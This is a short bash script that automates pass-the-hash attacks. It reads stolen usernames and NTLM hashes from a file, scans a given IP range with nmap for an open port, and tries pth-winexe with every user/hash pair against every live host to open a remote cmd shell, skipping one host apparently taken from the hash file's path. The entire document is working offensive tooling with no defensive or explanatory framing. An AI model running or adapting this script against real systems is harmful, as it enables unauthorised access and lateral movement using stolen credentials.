#!/bin/bash

# hashfile="/root/bin/passcrack/227/hashes"

read -p "hashfile path: " hashfile
read -p "ip/iprange/network: " iprange
read -p "port(s): " port

excludehost=$(echo $hashfile | awk -v FS="/" '{print $4}') 
export hashfile
export iprange
export port
export excludehost

echo '[*] begin' 
for line in $(cat ${hashfile}); do 
  export smbhash=$(echo $line | awk -F: '{print $3 ":" $4}') 
  export smbuser=$(echo $line | awk -F: '{print $1}') 
for host in $(nmap -p $port $iprange  -oG - | grep open | cut -d" " -f2); do 
        if [ "$host" != "192.168.15.$excludehost" ]; then
        echo "[+] trying $smbuser@$host with $smbhash"
            pth-winexe -U $smbuser%$smbhash //$host cmd; 
        else 
        true;
        fi
    done
done
